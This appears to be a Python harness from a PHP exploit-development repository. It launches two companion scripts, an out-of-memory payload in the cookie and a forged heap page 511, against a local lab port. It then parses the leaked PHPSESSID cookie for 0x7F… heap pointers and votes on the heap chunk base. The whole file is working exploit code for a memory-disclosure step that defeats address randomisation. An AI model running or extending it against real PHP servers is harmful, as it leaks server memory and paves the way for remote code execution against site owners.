#!/usr/bin/env python3
"""Run A (OOM-in-cookie) + B (page-511 forge) against one lab port and decode.

Uses the repo's own tools, copied and only patched for target port / output file.
Reports A status+length, B status, Set-Cookie decode (len, ptr count, chunk base).
"""
import os, re, subprocess, sys, urllib.parse
from collections import Counter

D = os.path.dirname(os.path.abspath(__file__))
port = sys.argv[1]
tag = sys.argv[2]
outdir = sys.argv[3]
os.makedirs(outdir, exist_ok=True)

env = dict(os.environ, TARGET_PORT=port)
a_resp = os.path.join(outdir, f"{tag}.a.resp")
b_resp = os.path.join(outdir, f"{tag}.b.resp")

# A: fixed calibrated shape from DISPLAY_ERRORS_OFF.md 3.1 / 5.5
a_env = dict(env, RESP_FILE=a_resp)
A_ARGS = os.environ.get("A_ARGS", "0 62 235 15000 208 0 4000 103").split()
ra = subprocess.run([sys.executable, os.path.join(D, "send_a_oom5.py")] + A_ARGS,
                    env=a_env, capture_output=True, text=True, timeout=120)
# B: two-field page-511 forge
b_env = dict(env, RESP_FILE=b_resp, BB1_LEN="1048551", BF_P1="256", BF_READ="4000")
rb = subprocess.run([sys.executable, os.path.join(D, "send_b_open.py"), "160", "231"],
                    env=b_env, capture_output=True, text=True, timeout=120)

def status(path):
    try:
        data = open(path, "rb").read()
    except OSError:
        return "NOFILE", b""
    m = re.match(rb"HTTP/1\.[01] (\d+)", data)
    return (m.group(1).decode() if m else "?"), data

sa, da = status(a_resp)
sb, db = status(b_resp)

res = {"tag": tag, "a_status": sa, "a_len": len(da),
       "a_cookie": bool(re.search(rb"Set-Cookie: PHPSESSID=", da)),
       "b_status": sb, "b_len": len(db)}
m = re.search(rb"Set-Cookie: PHPSESSID=([^\r\n]*?)(?:; path=/)?\r\n", db)
if m:
    raw = m.group(1).decode("latin1")
    val = urllib.parse.unquote_to_bytes(raw)
    res["cookie_wire"] = len(raw)
    res["cookie_decoded"] = len(val)
    ptrs = [int.from_bytes(val[j:j+8], "little") for j in range(max(0, len(val) - 8))]
    ptrs = [v for v in ptrs if 0x7F0000000000 <= v < 0x800000000000]
    res["ptrs"] = len(ptrs)
    if ptrs:
        c = Counter(v & ~0x1FFFFF for v in ptrs)
        base, n = c.most_common(1)[0]
        res["chunk_base"] = hex(base)
        res["chunk_votes"] = n
        res["first_ptrs"] = [hex(v) for v in ptrs[:6]]
else:
    res["cookie"] = "NO_COOKIE"
print("RESULT " + __import__("json").dumps(res))
